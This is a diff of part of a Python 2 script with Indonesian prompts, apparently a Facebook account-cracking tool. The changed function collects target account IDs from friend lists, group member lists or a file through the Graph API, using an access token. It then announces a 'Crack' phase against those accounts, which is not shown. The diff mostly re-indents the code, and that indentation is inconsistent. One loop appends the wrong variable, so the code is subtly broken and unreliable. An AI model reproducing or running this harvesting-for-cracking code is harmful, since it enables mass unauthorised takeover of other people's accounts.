@@ -188,80 +188,80 @@ def menu():
 	        print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
 	        pilih_super()
 
-def pilih_super():
-	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
-	if peak =="":
-		print "\033[1;96m[!] \x1b[1;91mNOT FOUND[!]"
-		pilih_super()
-	elif peak =="1":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		jalan('\033[1;96m[♪] \033[1;93mSEDANG MENGAMBIL ID [•] \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+bct)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif peak =="2":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+bct)
-			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
-		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
-			super()
-		jalan('\033[1;96m[♪] \033[1;93mMengambil ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+bct)
-		z = json.loads(r.text)
-		for i in z['data']:
-                        id.append(s['id'])
-        elif peak =="3":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
-		try:
-			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+bct)
-			asw=json.loads(r.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
-		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
-			super()
-		jalan('\033[1;96m[♪] \033[1;93mMengambil ID \033[1;97m...')
-		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+bct)
-		s=json.loads(re.text)
-		for p in s['data']:
-			id.append(p['id'])
-	elif peak =="4":
-                os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		try:
-			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
-			for line in open(idlist,'r').readlines():
-				id.append(line.strip())
-		except IOError:
-			print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
-			raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
-			super()
-	elif peak =="0":
-		menu()
-	else:
-		print "\033[1;96m[!] \x1b[1;91mHarap Isi Dengan benar"
-		pilih_super()
-	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	print 42*"\033[1;96m="
+        def pilih_super():
+	        peak = raw_input("\n\033[1;97m >>> \033[1;97m")
+	        if peak =="":
+		        print "\033[1;96m[!] \x1b[1;91mNOT FOUND[!]"
+		        pilih_super()
+	        elif peak =="1":
+		        os.system('clear')
+		        print logo
+		        print 42*"\033[1;96m="
+		        jalan('\033[1;96m[♪] \033[1;93mSEDANG MENGAMBIL ID [•] \033[1;97m...')
+		        r = requests.get("https://graph.facebook.com/me/friends?access_token="+bct)
+		        z = json.loads(r.text)
+		        for s in z['data']:
+			        id.append(s['id'])
+	        elif peak =="2":
+		        os.system('clear')
+		        print logo
+		        print 42*"\033[1;96m="
+		        idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
+		        try:
+			        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+bct)
+			        op = json.loads(jok.text)
+			        print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
+		        except KeyError:
+			        print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
+			        raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			        super()
+		        jalan('\033[1;96m[♪] \033[1;93mMengambil ID \033[1;97m...')
+		        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+bct)
+		        z = json.loads(r.text)
+		        for i in z['data']:
+                                id.append(s['id'])
+                elif peak =="3":
+		        os.system('clear')
+		        print logo
+		        print 42*"\033[1;96m="
+		        idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
+		        try:
+			        r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+bct)
+			        asw=json.loads(r.text)
+			        print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
+		        except KeyError:
+			        print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
+			        raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			        super()
+		        jalan('\033[1;96m[♪] \033[1;93mMengambil ID \033[1;97m...')
+		        re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+bct)
+		        s=json.loads(re.text)
+		        for p in s['data']:
+			        id.append(p['id'])
+	        elif peak =="4":
+                        os.system('clear')
+		        print logo
+		        print 42*"\033[1;96m="
+		        try:
+			        idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
+			        for line in open(idlist,'r').readlines():
+				        id.append(line.strip())
+		        except IOError:
+			        print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
+			        raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
+			        super()
+	        elif peak =="0":
+		        menu()
+	        else:
+		        print "\033[1;96m[!] \x1b[1;91mHarap Isi Dengan benar"
+		        pilih_super()
+	        print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
+	        titik = ['.   ','..  ','... ']
+	        for o in titik:
+		        print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+	        print
+	        print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	        print 42*"\033[1;96m="
 	
 			
 	def main(arg):
